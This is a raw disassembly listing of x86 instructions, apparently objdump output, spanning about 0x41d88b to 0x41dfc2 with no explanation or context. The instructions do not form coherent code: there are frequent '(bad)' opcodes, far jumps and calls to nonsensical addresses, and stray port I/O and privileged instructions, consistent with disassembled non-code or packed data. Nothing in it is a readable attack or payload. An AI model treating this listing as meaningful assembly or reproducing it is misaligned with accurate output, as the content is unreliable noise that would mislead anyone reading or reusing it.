  41d88b:	or     DWORD PTR [esp+eiz*2-0x6],edi
  41d88f:	jmp    0x41d81f
  41d891:	and    bl,BYTE PTR [ebx-0x3f]
  41d894:	mov    DWORD PTR [ecx+0x1b],eax
  41d897:	cmp    eax,0xd90160c2
  41d89c:	cmp    DWORD PTR [edi],ebx
  41d89e:	das    
  41d89f:	jmp    0xf0b7b3f3
  41d8a4:	mov    esi,0x167bbefd
  41d8a9:	mov    esi,0x410df713
  41d8ae:	xor    bl,dl
  41d8b0:	jmp    0x7cc2:0xca5444c9
  41d8b7:	xchg   edx,eax
  41d8b8:	shr    BYTE PTR [ebp+0x1c],0x72
  41d8bc:	lods   eax,DWORD PTR ds:[esi]
  41d8bd:	push   0x71f4eb01
  41d8c2:	ds push ecx
  41d8c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8c5:	sbb    eax,0xd02b49f2
  41d8ca:	inc    edx
  41d8cb:	jmp    0x4469:0xd60ac127
  41d8d2:	inc    ecx
  41d8d3:	fisubr WORD PTR [eax]
  41d8d5:	inc    esp
  41d8d6:	adc    al,ah
  41d8d8:	adc    al,0x96
  41d8da:	sbb    ah,BYTE PTR [ecx+ecx*8-0x7299a206]
  41d8e1:	aas    
  41d8e2:	(bad)  
  41d8e3:	adc    esp,edx
  41d8e5:	mov    dl,0xf2
  41d8e7:	or     dl,BYTE PTR [esi-0x2e]
  41d8ea:	dec    edi
  41d8eb:	push   ebp
  41d8ec:	(bad)  
  41d8ed:	mov    dh,0x9c
  41d8ef:	mov    al,0xfa
  41d8f1:	mov    edi,0x405f84f0
  41d8f6:	mov    esp,0x6636da6b
  41d8fb:	jl     0x41d8ed
  41d8fd:	cmp    DWORD PTR [ecx+0x1c],edx
  41d900:	xchg   DWORD PTR [ebp+0x18],esi
  41d903:	push   ebx
  41d904:	xor    eax,0x2f5444d6
  41d909:	cli    
  41d90a:	test   eax,0xb68d297b
  41d90f:	mov    bl,0x54
  41d911:	bound  eax,QWORD PTR ds:0x9d61b5e
  41d917:	add    DWORD PTR [edx+0x3ef3205e],edx
  41d91d:	(bad)  
  41d91e:	neg    DWORD PTR [esi-0x4e]
  41d921:	sub    ah,BYTE PTR [ecx-0x32d4f5a2]
  41d927:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d928:	std    
  41d929:	repnz xchg edi,eax
  41d92b:	inc    BYTE PTR cs:[esi-0x6b4aa04e]
  41d932:	mov    dl,0x50
  41d934:	inc    esp
  41d935:	add    BYTE PTR [ebx],0x47
  41d938:	in     eax,dx
  41d939:	or     DWORD PTR [ebx+0xc],0x26
  41d93d:	pop    esp
  41d93e:	mov    ch,0xfa
  41d940:	dec    ebp
  41d941:	sbb    al,0x16
  41d943:	xor    esp,DWORD PTR [esi+0x7db4a028]
  41d949:	test   al,0xc2
  41d94b:	or     al,0xa9
  41d94d:	dec    edi
  41d94e:	les    ecx,FWORD PTR [ebx-0x58]
  41d951:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d952:	xor    eax,0xbb56537a
  41d957:	dec    edi
  41d958:	push   ebx
  41d959:	in     al,dx
  41d95a:	mov    ebp,DWORD PTR [esi]
  41d95c:	adc    ch,BYTE PTR [ebx+0xf90d831]
  41d962:	xor    bh,BYTE PTR [edx-0x4d]
  41d965:	repnz xlat BYTE PTR ds:[ebx]
  41d967:	push   cs
  41d968:	inc    ebp
  41d969:	addr16 push ebx
  41d96b:	cmp    esp,DWORD PTR ss:[ecx]
  41d96e:	fs xor edx,esi
  41d971:	ins    BYTE PTR es:[edi],dx
  41d972:	xchg   ecx,eax
  41d973:	imul   DWORD PTR [ebx-0x73119c6]
  41d979:	ss ins DWORD PTR es:[edi],dx
  41d97b:	push   ecx
  41d97c:	imul   edi,DWORD PTR [edi+0x2c],0x76d57ee6
  41d983:	aaa    
  41d984:	mov    ss,WORD PTR [esi+0x7c]
  41d987:	xchg   ebx,eax
  41d988:	lods   eax,DWORD PTR ds:[esi]
  41d989:	aad    0x23
  41d98b:	test   eax,0x1f18c04c
  41d990:	fs scas eax,DWORD PTR es:[edi]
  41d992:	(bad)  
  41d993:	(bad)  
  41d994:	push   0xffffff84
  41d996:	adc    al,0x46
  41d998:	(bad)  [edi+0x27]
  41d99b:	scas   eax,DWORD PTR es:[edi]
  41d99c:	test   BYTE PTR ds:0x479fd06c,bh
  41d9a2:	mov    WORD PTR [ecx+0xa43361c],ds
  41d9a8:	call   0x42a77ab4
  41d9ad:	fdivr  st(1),st
  41d9af:	dec    edx
  41d9b0:	sub    ah,dl
  41d9b2:	pop    edi
  41d9b3:	cdq    
  41d9b4:	in     al,0x89
  41d9b6:	daa    
  41d9b7:	int3   
  41d9b8:	jno    0x41da00
  41d9ba:	or     DWORD PTR [ebx-0x6a],eax
  41d9bd:	jno    0x41da32
  41d9bf:	ret    0x3c58
  41d9c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9c3:	shl    BYTE PTR [eax],1
  41d9c5:	sub    eax,0xb27c981a
  41d9ca:	in     eax,dx
  41d9cb:	shl    ebx,0xb5
  41d9ce:	push   edi
  41d9cf:	push   cs
  41d9d0:	sbb    eax,0x75205232
  41d9d5:	comiss xmm0,DWORD PTR [esi+edx*8]
  41d9d9:	cmp    bh,BYTE PTR [edx-0x3d]
  41d9dc:	bound  ebx,QWORD PTR [edx-0x1a5cdfc7]
  41d9e2:	mov    edi,DWORD PTR [ebp+0x2c17e844]
  41d9e8:	inc    edx
  41d9e9:	sub    ecx,DWORD PTR [ebx+ecx*4]
  41d9ec:	sub    eax,0x1101d9a9
  41d9f1:	jo     0x41da09
  41d9f3:	pusha  
  41d9f4:	int    0xab
  41d9f6:	fisub  DWORD PTR [edi-0x53]
  41d9f9:	mov    bh,0x94
  41d9fb:	lods   eax,DWORD PTR ds:[esi]
  41d9fc:	xchg   esi,eax
  41d9fd:	nop
  41d9fe:	dec    ebp
  41d9ff:	stos   DWORD PTR es:[edi],eax
  41da00:	hlt    
  41da01:	out    dx,eax
  41da02:	leave  
  41da03:	out    0x97,eax
  41da05:	gs push es
  41da07:	or     bh,dl
  41da09:	push   ecx
  41da0a:	cmp    al,0x79
  41da0c:	(bad)  
  41da0e:	call   0x92979f65
  41da13:	enter  0x5771,0x9f
  41da17:	pop    ebp
  41da18:	shr    BYTE PTR [edx-0x66],cl
  41da1b:	xor    dl,BYTE PTR [edi-0x2943b518]
  41da21:	dec    ecx
  41da22:	sub    BYTE PTR [esi],dl
  41da24:	pushf  
  41da25:	in     eax,dx
  41da26:	dec    ebp
  41da27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da28:	leave  
  41da29:	mov    bl,0xd2
  41da2b:	test   BYTE PTR [eax-0x27],bl
  41da2e:	or     BYTE PTR [ebp+ecx*8+0x5ea50ca7],ah
  41da35:	hlt    
  41da36:	mov    ds:0xb3f5d321,al
  41da3b:	nop
  41da3c:	retf   
  41da3d:	pushf  
  41da3e:	popa   
  41da3f:	shl    ecx,cl
  41da41:	inc    esp
  41da42:	js     0x41da9a
  41da44:	cmp    DWORD PTR [ebp-0x4b],esp
  41da47:	push   0x413902ca
  41da4c:	sbb    ah,dl
  41da4e:	adc    DWORD PTR [edi],0x890d3c53
  41da54:	mov    dl,0x31
  41da56:	in     al,dx
  41da57:	jno    0x41d9fc
  41da59:	out    dx,al
  41da5a:	(bad)  
  41da5b:	lods   eax,DWORD PTR ds:[esi]
  41da5c:	mov    al,ds:0xc5373ac2
  41da61:	xchg   ecx,eax
  41da62:	mov    bl,0x7
  41da64:	and    al,0x38
  41da66:	or     al,0xdd
  41da68:	fwait
  41da69:	mov    cl,0xe1
  41da6b:	xchg   DWORD PTR [eax],edi
  41da6d:	ins    DWORD PTR es:[edi],dx
  41da6e:	xor    al,0x12
  41da70:	adc    DWORD PTR [edx],esi
  41da72:	push   ebx
  41da73:	jecxz  0x41da48
  41da75:	inc    edi
  41da76:	addr16 loopne 0x41da5e
  41da79:	aam    0x71
  41da7b:	repz ficom DWORD PTR [esi]
  41da7e:	push   cs
  41da7f:	mov    eax,ds:0xb323b3c5
  41da84:	mov    ?,edi
  41da86:	das    
  41da87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da88:	cmp    al,0xd
  41da8a:	dec    esp
  41da8b:	jb     0x41dabd
  41da8d:	inc    ebp
  41da8e:	bnd jne 0x41dad6
  41da91:	xor    BYTE PTR [ecx-0x4d60820f],dh
  41da97:	call   0x7b5932bf
  41da9c:	jmp    0x60b6:0x98870df1
  41daa3:	jp     0x41da6a
  41daa5:	dec    ecx
  41daa6:	dec    ebx
  41daa7:	ret    
  41daa8:	shr    BYTE PTR [ecx-0x5d89aaa],cl
  41daae:	xor    eax,0xf5c17600
  41dab3:	lea    ecx,[ecx+0x1f]
  41dab6:	push   ebx
  41dab7:	sub    cl,BYTE PTR ds:0xe84824bf
  41dabd:	clc    
  41dabe:	xor    eax,0xa2be5ca9
  41dac3:	or     eax,0x1f7a45b9
  41dac8:	in     eax,0x30
  41daca:	or     al,0x43
  41dacc:	sub    DWORD PTR fs:[ecx],0x78
  41dad0:	jmp    0x2193:0x7eaec53b
  41dad7:	retf   
  41dad8:	scas   al,BYTE PTR es:[edi]
  41dad9:	fmul   QWORD PTR [esi]
  41dadb:	in     eax,dx
  41dadc:	inc    edx
  41dadd:	imul   eax,DWORD PTR [edx],0x3f
  41dae0:	add    DWORD PTR [eax-0x76],0xcdedd758
  41dae7:	push   edi
  41dae8:	clc    
  41dae9:	jge    0x41db2e
  41daeb:	mov    esi,0x99b1fc79
  41daf0:	rcr    BYTE PTR [ebp-0x6f],1
  41daf3:	loopne 0x41db51
  41daf5:	clc    
  41daf6:	add    dh,BYTE PTR [edx+0x696e2563]
  41dafc:	test   al,0x26
  41dafe:	ins    DWORD PTR es:[edi],dx
  41daff:	sub    dl,bl
  41db01:	retw   
  41db03:	inc    esi
  41db04:	add    al,0xb1
  41db06:	mov    ds:0x2c9e6f82,al
  41db0b:	dec    eax
  41db0c:	inc    ebx
  41db0d:	fwait
  41db0e:	xor    al,0xe
  41db10:	lahf   
  41db11:	shr    BYTE PTR [eax+0x61],0x44
  41db15:	jo     0x41dab1
  41db17:	sub    BYTE PTR [ebx-0x44],dl
  41db1a:	sub    DWORD PTR [edx+ecx*2],edi
  41db1d:	jbe    0x41db65
  41db1f:	mov    dl,0xa
  41db21:	or     ch,BYTE PTR [edx]
  41db23:	das    
  41db24:	inc    eax
  41db25:	int3   
  41db26:	sbb    al,0x48
  41db28:	inc    edx
  41db29:	xchg   ebx,eax
  41db2a:	sbb    al,0xa6
  41db2c:	leave  
  41db2d:	dec    ebp
  41db2e:	dec    eax
  41db2f:	inc    ebx
  41db30:	and    al,0x43
  41db32:	push   ebx
  41db33:	jmp    0x2695:0x514b32d3
  41db3a:	cmp    eax,0x11c0918b
  41db3f:	pop    esi
  41db40:	out    0x4d,eax
  41db42:	cld    
  41db43:	sbb    ebx,edx
  41db45:	ins    BYTE PTR es:[edi],dx
  41db46:	mov    esi,0xd1720260
  41db4b:	or     DWORD PTR [eax],ebx
  41db4d:	lods   eax,DWORD PTR ds:[esi]
  41db4e:	call   0x91aa:0xb7835660
  41db55:	std    
  41db56:	sbb    eax,0x90b65f0e
  41db5b:	adc    eax,0x93a8c58d
  41db60:	pop    edi
  41db61:	lds    esi,FWORD PTR [ebp+0x42]
  41db64:	sbb    eax,0xefbeaf8f
  41db69:	sbb    al,BYTE PTR [esi]
  41db6b:	sbb    eax,0x8949a873
  41db70:	push   ss
  41db71:	xchg   DWORD PTR [esi+0x5a9ed449],edi
  41db77:	gs and eax,0xa445932c
  41db7d:	inc    esi
  41db7e:	pop    edx
  41db7f:	xor    ah,ch
  41db81:	mov    WORD PTR [ecx+ebx*8-0x3227bf90],ds
  41db88:	iret   
  41db89:	in     eax,dx
  41db8a:	mov    bl,0xf2
  41db8c:	loopne 0x41dbc1
  41db8e:	fcom   DWORD PTR [esi+0x21a8362f]
  41db95:	push   ds
  41db96:	ja     0x41db5f
  41db98:	and    dl,cl
  41db9a:	pop    ss
  41db9b:	or     al,0x9c
  41db9d:	mov    ss,WORD PTR [esi]
  41db9f:	xor    BYTE PTR [edi],ah
  41dba1:	out    dx,eax
  41dba2:	dec    ebp
  41dba3:	outs   dx,BYTE PTR ds:[esi]
  41dba4:	ins    DWORD PTR es:[edi],dx
  41dba5:	mov    esi,DWORD PTR [esi+0x7d52b5bf]
  41dbab:	outs   dx,DWORD PTR ds:[esi]
  41dbac:	push   edi
  41dbad:	mov    ebp,0xc46295f7
  41dbb2:	xchg   edx,eax
  41dbb3:	dec    ebx
  41dbb4:	lock ret 
  41dbb6:	cmp    al,0xc7
  41dbb8:	add    eax,0xc0fb62b8
  41dbbd:	pop    esi
  41dbbe:	add    BYTE PTR [edx-0x57],cl
  41dbc1:	stos   DWORD PTR es:[edi],eax
  41dbc2:	arpl   sp,sp
  41dbc4:	int3   
  41dbc5:	push   esp
  41dbc6:	add    DWORD PTR [eax-0x4857d2ab],esi
  41dbcc:	sub    esp,esi
  41dbce:	repnz sub ecx,esi
  41dbd1:	rcl    DWORD PTR [edx-0x62],cl
  41dbd4:	add    DWORD PTR [ecx],edi
  41dbd6:	adc    ebx,0xe38ab714
  41dbdc:	push   edx
  41dbdd:	data16 es and al,0x97
  41dbe1:	mov    BYTE PTR [edx+0x1e],bh
  41dbe4:	fbld   TBYTE PTR [eax+0x27]
  41dbe7:	xchg   ebx,eax
  41dbe8:	push   ss
  41dbe9:	cmp    BYTE PTR ds:0x9854c9ff,ah
  41dbef:	or     eax,0xb6dd41ea
  41dbf4:	mov    bl,0xb8
  41dbf6:	pop    ebx
  41dbf7:	inc    edx
  41dbf8:	mov    bh,ah
  41dbfa:	js     0x41dba5
  41dbfc:	jno    0x41dbef
  41dbfe:	adc    eax,0x6785952a
  41dc03:	pop    ebx
  41dc04:	inc    edx
  41dc05:	aas    
  41dc06:	pop    eax
  41dc07:	xor    BYTE PTR [edx+0x60],dl
  41dc0a:	int    0xf6
  41dc0c:	mov    ?,WORD PTR [esi-0x36]
  41dc0f:	sbb    BYTE PTR [edx],dh
  41dc11:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc13:	jl     0x41dbb9
  41dc15:	in     eax,0xa2
  41dc17:	das    
  41dc18:	hlt    
  41dc19:	rcl    DWORD PTR [eax],1
  41dc1b:	and    eax,0xe34c9da5
  41dc20:	cmp    BYTE PTR [ebp+0x51],bh
  41dc23:	mov    bh,0xe4
  41dc25:	(bad)
  41dc29:	rol    bl,cl
  41dc2b:	push   edx
  41dc2c:	xlat   BYTE PTR ds:[ebx]
  41dc2d:	mov    DWORD PTR [ecx+0x35],ebp
  41dc30:	push   DWORD PTR [ebp+0x75535be3]
  41dc36:	dec    eax
  41dc37:	mov    ebx,0xfb7ee897
  41dc3c:	jbe    0x41dc6c
  41dc3e:	rol    edx,cl
  41dc40:	mov    al,ds:0xf69e5e55
  41dc45:	popf   
  41dc46:	aas    
  41dc47:	push   edx
  41dc48:	jo     0x41dc5b
  41dc4a:	or     ecx,DWORD PTR [ebp+0x71178891]
  41dc50:	hlt    
  41dc51:	fisub  DWORD PTR [ebx]
  41dc53:	sar    DWORD PTR [edi+0x76ab4845],0x64
  41dc5a:	vpaddq xmm7,xmm7,XMMWORD PTR [ebx-0x22]
  41dc5f:	test   al,0xba
  41dc61:	jbe    0x41dc1e
  41dc63:	lock outs dx,DWORD PTR ds:[esi]
  41dc65:	cli    
  41dc66:	dec    esp
  41dc67:	lods   al,BYTE PTR ds:[esi]
  41dc68:	hlt    
  41dc69:	retf   0x4f2c
  41dc6c:	mov    edx,0x991d3367
  41dc71:	jg     0x41dc9d
  41dc73:	push   ss
  41dc74:	into   
  41dc75:	(bad)  
  41dc76:	jns    0x41dcd9
  41dc78:	xchg   BYTE PTR [edi],cl
  41dc7a:	jns    0x41dc7f
  41dc7c:	(bad)  
  41dc7d:	iret   
  41dc7e:	lods   eax,DWORD PTR ds:[esi]
  41dc7f:	rcl    BYTE PTR [ebp-0x46],0xd6
  41dc83:	cli    
  41dc84:	aad    0x87
  41dc86:	mov    BYTE PTR [ebp-0x70],ah
  41dc89:	push   ecx
  41dc8a:	lds    ebp,FWORD PTR [ecx+0x35]
  41dc8d:	dec    ecx
  41dc8e:	pop    edi
  41dc8f:	add    eax,0x84023557
  41dc94:	push   ds
  41dc95:	or     BYTE PTR [ebx+0x3d8a37eb],dl
  41dc9b:	adc    ebp,esp
  41dc9d:	neg    ecx
  41dc9f:	out    dx,eax
  41dca0:	les    edi,FWORD PTR [edi-0x7a]
  41dca3:	scas   eax,DWORD PTR es:[edi]
  41dca4:	mov    ?,WORD PTR [eax-0x42]
  41dca7:	(bad)  
  41dca8:	pop    ebx
  41dca9:	mov    cl,0xeb
  41dcab:	push   ebx
  41dcac:	and    al,0x28
  41dcae:	dec    edi
  41dcaf:	xchg   ebx,eax
  41dcb0:	out    dx,al
  41dcb1:	jge    0x41dca1
  41dcb3:	inc    ebp
  41dcb4:	dec    ecx
  41dcb5:	(bad)  
  41dcb6:	out    dx,eax
  41dcb7:	pop    ss
  41dcb8:	mov    ecx,DWORD PTR [ecx+0x6167179d]
  41dcbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcbf:	(bad)  
  41dcc0:	xor    al,0x2f
  41dcc2:	int    0xb
  41dcc4:	jnp    0x41dcc7
  41dcc6:	push   ebx
  41dcc7:	fstp   QWORD PTR [esi+ecx*8-0x6d]
  41dccb:	stc    
  41dccc:	push   ebx
  41dccd:	and    al,0xf
  41dccf:	jae    0x41dcb7
  41dcd1:	(bad)  
  41dcd2:	outs   dx,DWORD PTR ds:[esi]
  41dcd3:	in     al,0xa2
  41dcd5:	das    
  41dcd6:	push   esp
  41dcd7:	imul   eax,ebx,0xffffffa0
  41dcda:	xor    esi,DWORD PTR [esi+0x8]
  41dcdd:	es (bad) 
  41dcdf:	or     ebx,DWORD PTR [ecx]
  41dce1:	pop    ecx
  41dce2:	and    ecx,DWORD PTR [ecx+ebx*2+0x2e]
  41dce6:	jmp    0x41dd2c
  41dce8:	daa    
  41dce9:	scas   eax,DWORD PTR es:[edi]
  41dcea:	(bad)  
  41dcec:	push   0x41a01884
  41dcf1:	call   0x967411b2
  41dcf6:	test   BYTE PTR [eax+0x3dda1a80],0xed
  41dcfd:	mov    ch,0x6d
  41dcff:	push   es
  41dd00:	jmp    0x41dd55
  41dd02:	lods   al,BYTE PTR ds:[esi]
  41dd03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd04:	cmp    al,0xb6
  41dd06:	in     eax,0xb2
  41dd08:	nop
  41dd09:	pop    edi
  41dd0a:	inc    esp
  41dd0b:	ins    DWORD PTR es:[edi],dx
  41dd0c:	adc    ebp,0x4864975
  41dd12:	cmp    ch,ch
  41dd14:	and    DWORD PTR [eax],edi
  41dd16:	pop    ebx
  41dd17:	mov    bl,0x83
  41dd19:	aad    0xe4
  41dd1b:	jb     0x41dcf6
  41dd1d:	jne    0x41dd24
  41dd1f:	xor    DWORD PTR [ebx+ecx*2],edx
  41dd22:	inc    eax
  41dd23:	les    ebp,FWORD PTR [edx]
  41dd25:	fnstcw WORD PTR ds:0x50827fa2
  41dd2b:	cmc    
  41dd2c:	inc    ebx
  41dd2d:	scas   eax,DWORD PTR es:[edi]
  41dd2e:	es cwde 
  41dd30:	sbb    ebx,ecx
  41dd32:	pop    es
  41dd33:	stos   DWORD PTR es:[edi],eax
  41dd34:	sti    
  41dd35:	daa    
  41dd36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd37:	lds    eax,FWORD PTR [ebx+esi*4-0x66]
  41dd3b:	push   ds
  41dd3c:	mov    ds:0x4caa4f94,eax
  41dd41:	aam    0xab
  41dd43:	mov    edx,0x7eea25bc
  41dd48:	xchg   edi,eax
  41dd49:	out    0x10,eax
  41dd4b:	icebp  
  41dd4c:	add    BYTE PTR [esi-0x69],dl
  41dd4f:	push   edi
  41dd50:	das    
  41dd51:	pop    ebx
  41dd52:	je     0x41dd95
  41dd54:	pop    ebp
  41dd55:	pusha  
  41dd56:	shl    DWORD PTR [ebx],0x65
  41dd59:	push   0x57
  41dd5b:	inc    edi
  41dd5c:	mov    WORD PTR [ebx+0x6c],ds
  41dd5f:	mov    eax,ds:0x91db06f4
  41dd64:	adc    al,0x62
  41dd66:	pop    eax
  41dd67:	mov    ebp,0x921c2086
  41dd6c:	rcr    BYTE PTR [edx+0x4e],1
  41dd6f:	pop    ss
  41dd70:	stos   DWORD PTR es:[edi],eax
  41dd71:	and    al,0x51
  41dd73:	je     0x41dda7
  41dd75:	dec    eax
  41dd76:	out    0x52,al
  41dd78:	mov    dh,0xa
  41dd7a:	imul   eax,DWORD PTR [eax+0xb42585d],0x32175877
  41dd84:	shr    DWORD PTR [edx+0x47a397e],1
  41dd8a:	neg    BYTE PTR [edx]
  41dd8c:	ja     0x41dda8
  41dd8e:	xor    eax,0x109972ad
  41dd93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd94:	cmp    eax,DWORD PTR [esp+ebx*2-0x43]
  41dd98:	cmp    eax,0x6cc1944
  41dd9d:	popf   
  41dd9e:	arpl   WORD PTR [edx],ax
  41dda0:	push   edx
  41dda1:	push   es
  41dda2:	push   es
  41dda3:	scas   eax,DWORD PTR es:[edi]
  41dda4:	adc    BYTE PTR [esi-0x53],bl
  41dda7:	(bad)  
  41dda8:	out    0xc0,eax
  41ddaa:	sub    eax,0xa17aff21
  41ddaf:	ins    DWORD PTR es:[edi],dx
  41ddb0:	loopne 0x41dd84
  41ddb2:	ja     0x41dd82
  41ddb4:	xchg   esi,eax
  41ddb5:	out    0x7a,al
  41ddb7:	push   ebp
  41ddb8:	add    DWORD PTR [ecx],edx
  41ddba:	loop   0x41ddd1
  41ddbc:	pop    esp
  41ddbd:	pushf  
  41ddbe:	lahf   
  41ddbf:	sbb    ebp,DWORD PTR [edi+0x3d11e59d]
  41ddc5:	je     0x41de0b
  41ddc7:	sbb    bh,BYTE PTR ds:0x3b4e3c61
  41ddcd:	adc    eax,0x5e896d61
  41ddd2:	addr16 mov eax,ds:0x1d59
  41ddd6:	pop    es
  41ddd7:	jmp    0xa6128741
  41dddc:	mov    ch,0xfd
  41ddde:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41dde0:	pop    edx
  41dde1:	pop    eax
  41dde2:	nop
  41dde3:	or     ecx,esi
  41dde5:	push   edx
  41dde6:	icebp  
  41dde7:	mov    ds:0x3abf2102,eax
  41ddec:	mov    ah,0x4e
  41ddee:	xor    DWORD PTR [ebx],0x95c02421
  41ddf4:	popa   
  41ddf5:	fild   QWORD PTR [edi-0x11]
  41ddf8:	sbb    BYTE PTR [ecx-0xfe413dd],al
  41ddfe:	cmc    
  41ddff:	cld    
  41de00:	xchg   DWORD PTR [ebx-0x49],ecx
  41de03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de04:	mov    ds:0x2bed80bf,eax
  41de09:	fisttp DWORD PTR [esi]
  41de0b:	cmp    dl,BYTE PTR [eax]
  41de0d:	lock int3 
  41de0f:	mov    ah,0x32
  41de11:	jns    0x41ddd2
  41de13:	loope  0x41ddeb
  41de15:	nop
  41de16:	mov    edi,0x4b58fd99
  41de1b:	fldenv [ecx-0x3600387a]
  41de21:	cmp    DWORD PTR [edi+0x7b],esp
  41de24:	mov    ah,0xfc
  41de26:	pop    ss
  41de27:	iretw  
  41de29:	pop    ecx
  41de2a:	push   ebp
  41de2b:	push   ds
  41de2c:	mov    esp,ecx
  41de2e:	sbb    BYTE PTR ds:0x4b53cdc9,al
  41de34:	test   dh,bl
  41de36:	xchg   ebx,eax
  41de37:	jp     0x41de73
  41de39:	and    BYTE PTR [ebx-0x43e37358],ch
  41de3f:	lods   al,BYTE PTR ds:[esi]
  41de40:	mov    ebp,0xd3f3937
  41de45:	jb     0x41de7d
  41de47:	and    al,0x1a
  41de49:	(bad)  
  41de4b:	jmp    0x635f6493
  41de50:	jnp    0x41de5d
  41de52:	add    DWORD PTR [ebx+0x76928aa8],eax
  41de58:	fisub  WORD PTR [eax-0x2b]
  41de5b:	sti    
  41de5c:	add    al,0xea
  41de5e:	inc    eax
  41de5f:	gs jmp 0x41de29
  41de62:	adc    dh,BYTE PTR [ecx]
  41de64:	inc    edx
  41de65:	push   edi
  41de66:	call   DWORD PTR [esi+0x711ef5b7]
  41de6c:	sahf   
  41de6d:	xchg   ebx,eax
  41de6e:	fmul   QWORD PTR [esi+0x78b1ab7a]
  41de74:	mov    bh,0x37
  41de76:	adc    edx,DWORD PTR [eax-0x44]
  41de79:	std    
  41de7a:	dec    eax
  41de7b:	xchg   ebp,eax
  41de7c:	shl    ah,0x39
  41de7f:	push   ss
  41de80:	pop    eax
  41de81:	aas    
  41de82:	inc    edx
  41de83:	out    0xb6,eax
  41de85:	retf   0x6491
  41de88:	shl    BYTE PTR [edx+0x6e41e06],1
  41de8e:	jl     0x41dee8
  41de90:	mov    edx,0x133429e4
  41de95:	je     0x41de20
  41de97:	add    dl,0x95
  41de9a:	sub    al,0x4f
  41de9c:	cmp    eax,0xded7cfe
  41dea1:	push   ds
  41dea2:	mov    al,ds:0x262ed6ac
  41dea7:	sbb    BYTE PTR [ebx],ah
  41dea9:	int    0x2a
  41deab:	cmp    al,0x59
  41dead:	jnp    0x41df17
  41deaf:	xor    DWORD PTR [ebx+0x11],0xffffffab
  41deb3:	or     DWORD PTR [ecx+edi*1-0x5fbeaa81],eax
  41deba:	dec    eax
  41debb:	imul   edi,edi,0xffffffe9
  41debe:	sub    al,0x49
  41dec0:	xchg   ebp,eax
  41dec1:	ja     0x41deea
  41dec3:	mov    bl,0xc4
  41dec5:	and    al,BYTE PTR [esi]
  41dec7:	push   ds
  41dec8:	aaa    
  41dec9:	jge    0x41df0a
  41decb:	xchg   ebx,eax
  41decc:	jle    0x41df2f
  41dece:	xchg   ecx,eax
  41decf:	in     al,dx
  41ded0:	inc    edx
  41ded1:	adc    DWORD PTR [edi-0x7f],esi
  41ded4:	push   0xffffffb5
  41ded6:	and    BYTE PTR [ebx-0x69],0xcc
  41deda:	jl     0x41deb5
  41dedc:	arpl   WORD PTR [ebx-0x2e],di
  41dedf:	test   DWORD PTR [ecx-0x32745080],ebx
  41dee5:	sbb    DWORD PTR [eax+eax*8],ebx
  41dee8:	dec    eax
  41dee9:	mov    eax,ds:0x6fbfa1da
  41deee:	and    eax,0xa3437103
  41def3:	adc    cl,al
  41def5:	pushf  
  41def6:	sbb    eax,0xdf560a5b
  41defb:	cmp    al,0xcc
  41defd:	test   BYTE PTR [ebp+ebx*8-0x2db8d424],dl
  41df04:	xor    DWORD PTR [ebp-0x76],ebp
  41df07:	pop    ss
  41df08:	ret    
  41df09:	sbb    ebp,edi
  41df0b:	pop    edi
  41df0c:	ins    BYTE PTR es:[edi],dx
  41df0d:	add    bl,BYTE PTR [ebx]
  41df0f:	shl    BYTE PTR [edi+esi*8],cl
  41df12:	push   edi
  41df13:	and    BYTE PTR [edi-0x3e],bh
  41df16:	int3   
  41df17:	and    al,0xba
  41df19:	pop    ecx
  41df1a:	mov    bl,0x6a
  41df1c:	xchg   ebp,eax
  41df1d:	sub    DWORD PTR [eax],ecx
  41df1f:	inc    edx
  41df20:	ror    ebp,0x14
  41df23:	push   0x1
  41df25:	loopne 0x41df10
  41df27:	dec    eax
  41df28:	imul   esi,DWORD PTR ds:0xec6fa425,0xffffffeb
  41df2f:	arpl   WORD PTR gs:[ebp-0x2cdc142],ax
  41df36:	jne    0x41debb
  41df38:	pop    ebx
  41df39:	mov    ebx,DWORD PTR [ebp+0x68b7744c]
  41df3f:	mov    cl,0x93
  41df41:	cmp    eax,0x60cdbf2
  41df46:	push   cs
  41df47:	xor    BYTE PTR gs:[eax],dh
  41df4a:	pop    ebp
  41df4b:	or     ebx,DWORD PTR [edi-0x4d]
  41df4e:	dec    ebp
  41df4f:	in     al,0x6d
  41df51:	sub    al,0xd3
  41df53:	arpl   di,sp
  41df55:	sbb    eax,0x1af341ee
  41df5a:	xchg   ebx,eax
  41df5b:	retf   0xb7d4
  41df5e:	cmp    eax,0xea913333
  41df63:	xchg   ecx,eax
  41df64:	int    0x3c
  41df66:	cmp    eax,0x8d135736
  41df6b:	pop    edx
  41df6c:	mov    al,0x40
  41df6e:	mov    ds:0x9e16842,eax
  41df73:	jl     0x41dfc5
  41df75:	and    DWORD PTR [edi],eax
  41df77:	fadd   st,st(5)
  41df79:	repz out dx,al
  41df7b:	call   0x919f:0xa5de502e
  41df82:	sbb    eax,0x65fb3b1d
  41df87:	outs   dx,DWORD PTR ds:[esi]
  41df88:	scas   al,BYTE PTR es:[edi]
  41df89:	add    DWORD PTR ds:0x78195f7b,esp
  41df8f:	icebp  
  41df90:	dec    edi
  41df91:	xchg   ebx,eax
  41df92:	and    ebp,DWORD PTR [edx]
  41df94:	lea    edx,[ebx-0x78dd85d]
  41df9a:	ss mov dl,0x0
  41df9d:	jge    0x41dfed
  41df9f:	retf   0x90f4
  41dfa2:	push   esi
  41dfa3:	aas    
  41dfa4:	jg     0x41df8e
  41dfa6:	icebp  
  41dfa7:	test   eax,0x50d7fdc4
  41dfac:	adc    al,0x2
  41dfae:	dec    esp
  41dfaf:	jle    0x41df73
  41dfb1:	retf   
  41dfb2:	loope  0x41dfad
  41dfb4:	and    eax,0x8998f647
  41dfb9:	ficomp WORD PTR [edi-0x17]
  41dfbc:	push   ecx
  41dfbd:	mov    esi,0x96a8f378
  41dfc2:	repz es test eax,0xd01477c3
